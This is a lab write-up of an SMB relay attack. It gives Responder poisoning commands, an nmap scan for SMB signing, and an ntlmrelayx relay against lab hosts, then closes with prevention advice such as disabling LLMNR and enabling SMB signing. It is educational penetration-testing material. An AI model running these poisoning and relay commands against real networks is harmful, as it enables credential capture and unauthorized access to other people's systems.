# SMB Relay Attack

**Date:** May 2026  
**Author:** ShahinSecLab  
**Category:** Network Attack / Credential Capture  
**Difficulty:** Easy  
**Tools:** Responder, Hashcat  

## Table of Contents

- [Introduction](#introduction)
- [Lab Setup](#lab-setup)
- [Attack Flow](#attack-flow)
- [Step 1: Disable SMB and HTTP in Responder](#step-1-disable-smb-and-http-in-responder)
- [Step-2: SMB2 Secutiy Mode Check](#step-2-smb2-security-mode-check)
- [Step 3: Create Target List](#step-3-create-target-list)
- [Step 4: Start Responder](#step-4-start-responder)
- [Step 5: Start ntlmrelayx](#step-4-start-ntlmrelayx)
- [Step 6: Trigger Authentication](#step-5-trigger-authentication)
- [Step 7: Successful Relay](#step-6-successful-relay)
- [Result](#result)
- [Prevention](#prevention)
- [Key Takeaways](#key-takeaways)
- [References](#references)


## Introduction

SMB Relay is a network attack where an attacker captures a user's authentication request and forwards it to victim machine instead of cracking the password. If the target system accepts the authentication, the attacker can gain access using the victim's session.

### Lab Setup
```
|    Machine         |      OS       |               Role                   |      Ip       |
| ------------------ |------------------------------------------------------|---------------|
| Attacker           | Kali Linux    | Attack machine                       | 192.168.5.128 |
| Victim             | Windows 10    | Victim machine(Authentication Source)| 192.168.5.135 |
| Windows Server / DC| Windows Server| Domain Controller / Protected Target | 192.168.5.134 |
| Target             | Windows 10    | Relay Target (Vulnerable Host)       | 192.168.5.136 |

```

### Attack Flow

```text
┌─────────────────────────────────────────────┐
│ 1. Victim tries to access a network resource│
│                                             │
│ Example:                                    │
│ \\fileserver                                │
│ \\shared-folder                             │
└─────────────────────────────────────────────┘
                      │
                      ▼
┌─────────────────────────────────────────────┐
│ 2. The system cannot find the resource      │
│                                             │
│ Windows sends LLMNR/NBT-NS request asking:  │
│ "Who has this resource?"                    │
└─────────────────────────────────────────────┘
                      │
                      ▼
┌─────────────────────────────────────────────┐
│ 3. Responder replies first                  │
│                                             │
│ Attacker machine says:                      │
│ "I have that resource."                     │
└─────────────────────────────────────────────┘
                      │
                      ▼
┌─────────────────────────────────────────────┐
│ 4. Victim sends NTLM authentication         │
│                                             │
│ Example:                                    │
│ DOMAIN\user                                 │
└─────────────────────────────────────────────┘
                      │
                      ▼
┌─────────────────────────────────────────────┐
│ 5. ntlmrelayx captures and forwards         │
│                                             │
│ Authentication is forwarded to victim       │
│ instead of cracking the password hash       │
└─────────────────────────────────────────────┘
                      │
                      ▼
┌─────────────────────────────────────────────┐
│ 6. Target system receives request           │
│                                             │
│ SMB signing disabled → authentication       │
│ accepted                                    │
└─────────────────────────────────────────────┘
                      │
                      ▼
┌─────────────────────────────────────────────┐
│ 7. Attacker gains access                    │
│                                             │
│ • Access shared files                       │
│ • Run commands                              │
│ • Dump hashes                               │
│ • Enumerate users                           │
│ • Move to other systems                     │
└─────────────────────────────────────────────┘
```

## Attack Steps

### Step 1: Disable SMB and HTTP in Responder

- Open the Responder configuration file:

```bash
sudo nano /etc/responder/Responder.conf
```
- Find these lines and change them:

```bash
SMB = Off
HTTP = Off
```

- Save and exit:

```bash
CTRL + X
Y
ENTER
```
<p align="center">
  <img src="/writeups/02-smb-relay/images/step1.png" width="600">
</p>

### Step-2: SMB2 Secutiy Mode Check

- Run:
```bash
nmap --script smb2-security-mode -p 445 192.168.5.0/24
```

```
|             Flag            |                               | Meaning                                                   |
|-----------------------------|-------------------------------------------------------------------------------------------|
| nmap                        | Network scanning tool used for reconnaissance                                             |
| --script smb2-security-mode | Runs an Nmap NSE script to check SMB v2/v3 security configuration, especially SMB signing |
| -p 445                      | Targets port 445 (SMB service)                                                            |
| 192.168.5.0/24              | Scans the entire subnet (all hosts from 192.168.5.1 to 192.168.5.254)                     |
```

<p align="center">
  <img src="/writeups/02-smb-relay/images/step2.png" width="600">
</p>

### Step 3: Create Target List

- Create a file for target IP addresses:

```bash
nano targets.txt
```
<p align="center">
  <img src="/writeups/02-smb-relay/images/step3-1.png" width="600">
</p>

- Add Targets:

```bash
192.168.5.134
192.168.5.135
192.168.5.136
```
<p align="center">
  <img src="/writeups/02-smb-relay/images/step3-2.png" width="600">
</p>

- Save and exit:

```bash
CTRL + X
Y
ENTER
```

### Step 4: Start Responder

- Run:

```bash
sudo responder -I eth0 -dwv
```
```
|    Flag   |     Meaning       |
|-----------|-------------------|
| -I eth0   | Network interface |
|    -d     | DHCP poisoning    |
|    -w     | WPAD proxy server |
|    -v     | Verbose mode      |
```

<p align="center">
  <img src="/writeups/02-smb-relay/images/step4.png" width="600">
</p>

### Step 5: Start ntlmrelayx

- In another terminal

Run:

```bash
sudo ntlmrelayx.py -tf targets.txt -smb2support
```

```
|     Flag                       | Meaning                         |
|----------------|-------------------------------------------------|
| ntlmrelayx.py  | Impacket tool used to perform NTLM relay attacks|
| -tf targets.txt|Target file containing a list of SMB targets     |
| -smb2support   | Enables SMB2/SMB3 protocol support              |
```

<p align="center">
  <img src="/writeups/02-smb-relay/images/step5.png" width="600">
</p>

### Step 6: Trigger Authentication

- From the victim machine:

Run:

```bash
\\fakeshare
```
Now hit Enter button. The victim system will try to connect and send NTLM authentication.

<p align="center">
  <img src="/writeups/02-smb-relay/images/step6.png" width="600">
</p>

### Step 7: Successful Relay

- The attack works successfully:

<p align="center">
  <img src="/writeups/02-smb-relay/images/step7.png" width="600">
</p>


## Prevention

### To reduce the chance of SMB relay attacks:

- Disable LLMNR
- Disable NBT-NS
- Enable SMB signing
- Keep systems updated
- Use network segmentation

### Key Takeaways

- SMB Relay does **not crack passwords**, it reuses authentication sessions
- SMB signing is one of the strongest protections against relay attacks
- LLMNR and NBT-NS are major weak points in Windows networks
- NTLM authentication should be restricted or replaced with stronger methods
- Proper network segmentation reduces impact even if attack succeeds
- Most SMB relay attacks succeed due to misconfiguration, not complexity

### References

- Microsoft Documentation – SMB Security  
  https://learn.microsoft.com/en-us/windows-server/storage/file-server/smb-security

- Microsoft NTLM Overview  
  https://learn.microsoft.com/en-us/windows-server/security/kerberos/ntlm-overview

- Impacket Project (ntlmrelayx tool)  
  https://github.com/fortra/impacket

- Responder Tool Documentation  
  https://github.com/lgandx/Responder

- SMB Relay Attack Explanation (General Concept)  
  https://attack.mitre.org/techniques/T1557/001/